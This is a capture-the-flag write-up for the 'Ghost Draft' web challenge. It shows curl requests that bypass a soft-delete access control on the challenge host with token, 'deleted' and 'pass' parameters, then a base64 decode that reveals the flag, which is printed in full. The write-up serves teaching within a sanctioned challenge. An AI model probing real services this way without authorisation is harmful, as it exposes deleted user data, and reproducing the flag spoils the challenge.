# Ghost Draft - Web Challenge Writeup

**Flag:** `VishwaCTF{s0Ft_d3let3_!s_nOt_dEl3te}`

## Challenge Description
An internal report from SecureDocs was accidentally exposed. Records have been deleted, but something feels off. Some data doesn't behave the way it should.

## Hints
1. Deleted data may still exist - try looking for ways to include it
2. Some parts of URL are handled only by browser, not server (fragments #)

## Solution

### Discovery
1. Found `/script.js` which reveals fragment-based behavior
2. Fragment `#draft` unlocks access to `/api/notes?token=draftkey123`
3. Note 13 is marked as "Archived Record (Unavailable)" - the deleted data

### Exploitation
The key was understanding the hints:
- "Deleted data may still exist" → Note 13 exists but is blocked
- "Ways to include it" → Need special parameter

Testing parameters on note 13:
```bash
curl "https://ghost.vishwactf.com/note/13?token=draftkey123&deleted=true"
# Returns: {"error":"Password required","hint":"Provide 'pass' parameter"}
```

Using the token as password:
```bash
curl "https://ghost.vishwactf.com/note/13?token=draftkey123&deleted=true&pass=draftkey123"
# Returns: {"content":"cleanup pending – VmlzaHdhQ1RGe3MwRnRfZDNsZXQzXyFzX25PdF9kRWwzdGV9"...}
```

Decode base64:
```bash
echo "VmlzaHdhQ1RGe3MwRnRfZDNsZXQzXyFzX25PdF9kRWwzdGV9" | base64 -d
# VishwaCTF{s0Ft_d3let3_!s_nOt_dEl3te}
```

## Key Takeaways
- Soft deletes don't actually remove data
- Fragment identifiers (#) are client-side only
- Always check for parameter-based access controls
- Deleted records may be accessible with special parameters
